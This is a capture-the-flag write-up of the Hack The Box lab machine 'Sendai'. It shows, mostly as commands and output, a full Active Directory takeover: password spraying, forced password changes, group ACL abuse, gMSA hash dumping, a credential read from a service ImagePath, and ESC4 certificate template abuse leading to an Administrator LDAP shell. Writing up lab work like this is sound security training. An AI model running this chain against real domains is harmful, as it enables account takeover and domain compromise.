Author: Faridd

### HTB Write-Up: Sendai

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Sendai)      |
| Difficulty | Medium                                                            |
| OS         | Windows                                                           |
| Date       | November 08, 2026                                                 |

---

#### Table of Contents
1. [Reconnaissance — Rustscan & SMB Share Enumeration](#1-reconnaissance--rustscan--smb-share-enumeration)
2. [Enumeration — RID Brute Forcing & Username Validation](#2-enumeration--rid-brute-forcing--username-validation)
3. [Initial Access — Exploiting STATUS_PASSWORD_MUST_CHANGE Accounts](#3-initial-access--exploiting-status_password_must_change-accounts)
4. [Lateral Movement — GenericAll Group Abuse & gMSA Password Dumping](#4-lateral-movement--genericall-group-abuse--gmsa-password-dumping)
5. [Credential Discovery — Plaintext Password in a Service's ImagePath](#5-credential-discovery--plaintext-password-in-a-services-imagepath)
6. [Privilege Escalation — AD CS ESC4 Template Abuse & LDAP Shell to Domain Admin](#6-privilege-escalation--ad-cs-esc4-template-abuse--ldap-shell-to-domain-admin)

---

#### 1. Reconnaissance — Rustscan & SMB Share Enumeration

```bash
rustscan -a 10.129.234.66 --ulimit=5000
```

**Open Ports:**

```
Open 10.129.234.66:53
Open 10.129.234.66:80
Open 10.129.234.66:88
Open 10.129.234.66:135
Open 10.129.234.66:139
Open 10.129.234.66:389
Open 10.129.234.66:443
Open 10.129.234.66:445
Open 10.129.234.66:464
Open 10.129.234.66:593
Open 10.129.234.66:636
Open 10.129.234.66:3268
Open 10.129.234.66:3269
Open 10.129.234.66:5985
Open 10.129.234.66:9389
Open 10.129.234.66:49664
```

The port set confirms a Windows **Domain Controller** (hostname **DC**, domain **sendai.vl**).

##### 1.1 — Guest SMB Access

```bash
netexec smb 10.129.234.66 -u "guest" -p "" --shares
```

**Result:**

```
[+] sendai.vl\guest: 
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
config                          
IPC$            READ            Remote IPC
NETLOGON                        Logon server share 
sendai          READ            company share
SYSVOL                          Logon server share 
Users           READ            
```

Guest access was accepted, and the non-default **`sendai`** share was readable.

##### 1.2 — Exploring the sendai Share

```bash
smbclient //10.129.234.66/sendai -N
smb: \> recurse on
smb: \> ls
```

**Result:**

```
hr
incident.txt
it
legal
security
transfer
```

```bash
smb: \> get incident.txt
smb: \cd security
smb: \security\> get guidelines.txt
```

`incident.txt` only warned staff that company passwords had been found to be weak and new guidelines were being issued. `guidelines.txt` contained generic security-policy text (data backup rules, etc.) — no credentials in either. The `it` folder held only `Bginfo64.exe` and `PsExec64.exe`, and `hr`/`legal` were empty.

The `transfer` folder was the one useful lead — it listed real domain usernames as directory names:

```
anthony.smith
clifford.davey
elliot.yates
lisa.williams
susan.harper
temp
thomas.powell
```

---

#### 2. Enumeration — RID Brute Forcing & Username Validation

##### 2.1 — RID Brute Forcing for a Full User List

To build a complete and reliable username list rather than relying on the partial names from the share, RID brute forcing was used against the guest session:

```bash
netexec smb 10.129.234.66 -u 'guest' -p '' --rid-brute
```

The output was filtered down to actual user accounts:

```bash
cat users | grep SidTypeUser > newusers
cat newusers | awk '{print$6}' | cut -d'\' -f2 > users.txt
```

**Result:**

```
Administrator
Guest
krbtgt
DC$
sqlsvc
websvc
Dorothy.Jones
Kerry.Robinson
Naomi.Gardner
Anthony.Smith
Susan.Harper
Stephen.Simpson
Marie.Gallagher
Kathleen.Kelly
Norman.Baxter
Jason.Brady
Elliot.Yates
Malcolm.Smith
Lisa.Williams
Ross.Sullivan
Clifford.Davey
Declan.Jenkins
Lawrence.Grant
Leslie.Johnson
Megan.Edwards
Thomas.Powell
mgtsvc$
```

##### 2.2 — Confirming Usernames with Kerbrute

```bash
kerbrute userenum --dc 10.129.234.66 -d sendai.vl users.txt
```

**Result:**

```
Done! Tested 27 usernames (26 valid) in 0.458 seconds
```

Nearly all usernames from the RID brute force were confirmed valid against the KDC directly, giving high confidence in the list for the next stage.

---

#### 3. Initial Access — Exploiting STATUS_PASSWORD_MUST_CHANGE Accounts

##### 3.1 — AS-REP Roasting (Unsuccessful)

Since the incident notice mentioned weak passwords, AS-REP Roasting was attempted first as it requires no credentials at all:

```bash
impacket-GetNPUsers sendai.vl/ -usersfile users.txt -no-pass -dc-ip 10.129.234.66 -format hashcat
```

**Result:**

```
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
... (all users had pre-authentication enabled)
```

No account had Kerberos pre-authentication disabled, so this path yielded nothing.

##### 3.2 — Spraying Empty Passwords

```bash
netexec smb 10.129.234.66 -u users.txt -p '' --continue-on-success
```

**Result (relevant extract):**

```
[+] sendai.vl\Guest: 
[-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE
[-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE
(all other accounts: STATUS_LOGON_FAILURE)
```

Two accounts, **`Elliot.Yates`** and **`Thomas.Powell`**, returned a distinctly different error — `STATUS_PASSWORD_MUST_CHANGE` rather than a generic logon failure. This specifically means the account has an **empty/expired password that Windows is willing to accept for a password-change operation**, even though it won't grant a normal session. NetExec has a dedicated module to exploit exactly this condition and set a new password via SAMR.

##### 3.3 — Forcing a Password Change

```bash
netexec smb 10.129.234.66 -u Thomas.Powell -p '' -M change-password -o NEWPASS=password
```

**Result:**

```
[-] SMB-SAMR password change failed: STATUS_PASSWORD_RESTRICTION
```

The first attempted new password was rejected by the domain's password policy (too weak/short). A stronger password was tried:

```bash
netexec smb 10.129.234.66 -u Thomas.Powell -p '' -M change-password -o NEWPASS=Password123#
```

**Result:**

```
[+] Successfully changed password for Thomas.Powell
```

The same technique was repeated for `Elliot.Yates`:

```bash
netexec smb 10.129.234.66 -u Elliot.Yates -p '' -M change-password -o NEWPASS=Password123#
```

**Result:**

```
[+] Successfully changed password for Elliot.Yates
```

Both accounts now had known, usable passwords: `Thomas.Powell:Password123#` and `Elliot.Yates:Password123#`.

##### 3.4 — Confirming Access

Neither account had WinRM access, so the foothold here was limited to SMB/LDAP:

```bash
netexec winrm 10.129.234.66 -u Elliot.Yates -p 'Password123#'
# access denied

netexec ldap 10.129.234.66 -u Elliot.Yates -p 'Password123#'
# [+] sendai.vl\Elliot.Yates:Password123#
```

With valid LDAP credentials in hand, BloodHound data collection was the natural next step.

---

#### 4. Lateral Movement — GenericAll Group Abuse & gMSA Password Dumping

##### 4.1 — Collecting BloodHound Data

```bash
bloodhound-python -ns 10.129.234.66 -d sendai.vl -u Elliot.Yates -p 'Password123#' -c All --zip
```

Analysis revealed a clear abuse chain: **`Thomas.Powell`** is a member of the **`Support`** group, which holds **GenericAll** over the **`ADMSVC`** group. The `ADMSVC` group, in turn, holds **ReadGMSAPassword** rights over the **`MGTSVC$`** computer account — a Group Managed Service Account (gMSA) — which is itself a member of **Remote Management Users**.

In short: `Thomas.Powell` → (GenericAll) → `ADMSVC` group → (ReadGMSAPassword) → `mgtsvc$` → (member of Remote Management Users) → WinRM access as `mgtsvc$`.

##### 4.2 — Adding Thomas.Powell to ADMSVC

GenericAll over a group allows adding/removing its members directly:

```bash
net rpc group addmem "ADMSVC" "Thomas.Powell" -U "sendai.vl"/"Thomas.Powell"%"Password123#" -S "dc.sendai.vl"
```

```bash
net rpc group members "ADMSVC" -U "sendai.vl"/"Thomas.Powell"%"Password123#" -S "dc.sendai.vl"
```

**Result:**

```
SENDAI\websvc
SENDAI\Norman.Baxter
SENDAI\Thomas.Powell
```

`Thomas.Powell` was confirmed added to the group.

##### 4.3 — Dumping the gMSA Password

With `ADMSVC` membership, `Thomas.Powell` now inherits `ReadGMSAPassword` over `mgtsvc$`:

```bash
python3 gMSADumper.py -u 'Thomas.Powell' -p 'Password123#' -d 'sendai.vl'
```

**Result:**

```
Users or groups who can read password for mgtsvc$:
 > admsvc
mgtsvc$:::88d544b552c4763c0333db7e48708a0d
```

The NT hash for the `mgtsvc$` gMSA was recovered.

##### 4.4 — Shell & User Flag

```bash
evil-winrm -i 10.129.234.66 -u 'mgtsvc$' -H 88d544b552c4763c0333db7e48708a0d
```

```powershell
*Evil-WinRM* PS C:\> type user.txt
fff335936142d21a6fa44123b897cd3e
```

---

#### 5. Credential Discovery — Plaintext Password in a Service's ImagePath

A `config` directory sitting directly under `C:\` stood out as unusual, prompting a closer look at what else might be non-default on this host — specifically, locally running Windows services.

##### 5.1 — Why Check Service ImagePaths

Windows services often run with elevated privileges and are frequently set up by sysadmins installing custom monitoring agents, backup tools, or internal utilities — unlike built-in Microsoft services, these are more likely to be configured hastily, sometimes with credentials hardcoded directly into the service's startup command rather than stored securely. The `ImagePath` registry value under each service's key is literally the full command line Windows uses to launch it, including any `-u username -p password`-style arguments — and critically, `HKLM\SYSTEM\CurrentControlSet\services` is readable by any authenticated user by default, not just administrators.

##### 5.2 — Enumerating Service ImagePaths

Built-in services hosted via `svchost.exe` make up the vast majority of entries and were filtered out to surface anything custom:

```powershell
dir -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | `
  Select-Object ImagePath | select-string -NotMatch "svchost.exe" | select-string "exe"
```

Scanning through the (mostly legitimate Microsoft/third-party) results, one entry stood out immediately:

```
@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}
```

A custom `helpdesk.exe` service was launched with a **plaintext username and password** baked directly into its startup arguments.

##### 5.3 — Validating the Credential

```bash
netexec smb dc.sendai.vl -u 'clifford.davey' -p 'RFmoB2WplgE_3p'
```

**Result:**

```
[+] sendai.vl\clifford.davey:RFmoB2WplgE_3p
```

BloodHound showed `clifford.davey` is a member of the **`CA-Operators`** group — notable given this domain runs Active Directory Certificate Services, making it worth checking for AD CS misconfigurations next.

---

#### 6. Privilege Escalation — AD CS ESC4 Template Abuse & LDAP Shell to Domain Admin

##### 6.1 — Finding the Vulnerable Template

```bash
certipy find -vulnerable -stdout -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-host dc.sendai.vl
```

**Key finding:**

```
Template Name                       : SendaiComputer
    Full Control Principals         : SENDAI.VL\ca-operators
    Write Owner Principals          : SENDAI.VL\ca-operators
    Write Dacl Principals           : SENDAI.VL\ca-operators
    [+] User ACL Principals         : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                          : User has dangerous permissions.
```

The `ca-operators` group — which `clifford.davey` belongs to — has **Full Control** over the `SendaiComputer` certificate template's AD object. This is an **ESC4** condition: because the group can rewrite the template's own security configuration, it can reconfigure the template into an exploitable state (enrollee-suppliable subject, client authentication EKU) and then request a certificate as if it were a classic ESC1-vulnerable template.

##### 6.2 — Requesting a Certificate as Administrator

```bash
certipy-ad req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' \
  -dc-ip 10.129.234.66 \
  -target 10.129.234.66 \
  -ca 'sendai-DC-CA' \
  -template SENDAICOMPUTER \
  -upn 'administrator' \
  -sid 'S-1-5-21-3085872742-570972823-736764132-500'
```

**Result:**

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[+] Found SID in SAN URL: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

A certificate valid for authenticating as the Administrator account — including the correct SID in the security extension — was successfully obtained.

##### 6.3 — Kerberos/PKINIT Authentication Fails

The normal next step, converting the certificate into a Kerberos TGT, was attempted first:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66 -username administrator -domain sendai.vl -debug
```

**Result:**

```
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

This error means the KDC rejected the specific PKINIT pre-authentication data type sent in the request — a known friction point with certificate-based Kerberos authentication (PKINIT), which is a much stricter, narrower protocol path than plain LDAPS. It can happen when PKINIT is partially hardened on the DC or a particular padata format isn't negotiated correctly by the client tooling. This is common enough in HTB-style AD labs that there's a standard fallback for it.

##### 6.4 — Falling Back to an LDAP Shell via Schannel

Instead of Kerberos, the certificate was used to authenticate directly to LDAPS using **Schannel** (TLS client-certificate authentication) — a completely different authentication path that bypasses Kerberos pre-auth negotiation entirely. Since the certificate was legitimately issued by the domain's own CA (even though obtained through ESC4 abuse), Active Directory trusts it fully for binding over TLS and maps it straight to the Administrator account:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66 -username administrator -domain sendai.vl -ldap-shell
```

**Result:**

```
[*] Connecting to 'ldaps://10.129.234.66:636'
[*] Authenticated to '10.129.234.66' as: 'u:SENDAI\Administrator'
Type help for list of commands

# whoami
u:SENDAI\Administrator
```

##### 6.5 — Resetting the Administrator Password via the LDAP Shell

```
# change_password administrator Password123#
Got User DN: CN=Administrator,CN=Users,DC=sendai,DC=vl
Password changed successfully!
```

##### 6.6 — Shell & Root Flag

```bash
evil-winrm -i 10.129.234.66 -u Administrator -p 'Password123#'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
1bc134a7b4ae19fcc072082026d991cf
```
